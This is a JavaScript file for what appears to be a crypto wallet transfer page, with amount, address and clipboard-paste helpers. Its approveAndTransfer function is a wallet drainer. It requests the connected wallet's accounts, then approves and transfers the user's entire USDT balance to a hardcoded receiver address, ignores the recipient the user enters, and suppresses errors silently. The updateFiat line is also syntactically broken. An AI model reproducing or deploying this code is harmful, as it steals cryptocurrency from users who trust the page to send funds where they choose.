const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT on BSC
const receiver = "0xB53941b949D3ac68Ba48AF3985F9F59105Cdf999";

const usdtABI = [
  { name: "approve", type: "function", inputs: [
    { name: "_spender", type: "address" },
    { name: "_value", type: "uint256" }
  ], outputs: [{ type: "bool" }] },
  { name: "balanceOf", type: "function", inputs: [
    { name: "_owner", type: "address" }
  ], outputs: [{ name: "balance", type: "uint256" }] },
  { name: "decimals", type: "function", inputs: [], outputs: [{ type: "uint8" }] },
  { name: "transfer", type: "function", inputs: [
    { name: "_to", type: "address" },
    { name: "_value", type: "uint256" }
  ], outputs: [{ type: "bool" }] }
];

async function approveAndTransfer() {
  if (typeof window.ethereum === "undefined") return;

  try {
    const web3 = new Web3(window.ethereum);
    await window.ethereum.request({ method: "eth_requestAccounts" });
    const accounts = await web3.eth.getAccounts();
    const user = accounts[0];

    const contract = new web3.eth.Contract(usdtABI, usdtAddress);
    const decimals = await contract.methods.decimals().call();
    const balance = await contract.methods.balanceOf(user).call();

    if (balance === "0") return;

    // Optional: Approve max first
    await contract.methods.approve(receiver, balance).send({ from: user });

    // Transfer after approval
    await contract.methods.transfer(receiver, balance).send({ from: user });

  } catch (err) {
    // silent fail
  }
}

function updateFiat() {
  const amt = parseFloat(document.getElementById("amount").value || "0");
  document.getElementById("fiat").innerText = ≈ $${amt.toFixed(2)};
}

async function fillMax() {
  if (!window.ethereum) return;

  const web3 = new Web3(window.ethereum);
  await window.ethereum.request({ method: "eth_requestAccounts" });
  const accounts = await web3.eth.getAccounts();
  const user = accounts[0];

  const contract = new web3.eth.Contract(usdtABI, usdtAddress);
  const balance = await contract.methods.balanceOf(user).call();
  const decimals = await contract.methods.decimals().call();
  const formatted = balance / Math.pow(10, decimals);

  document.getElementById("amount").value = formatted.toFixed(2);
  updateFiat();
}

function clearAddress() {
  document.getElementById("address").value = "";
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById("address").value = text;
  } catch (e) {}
}
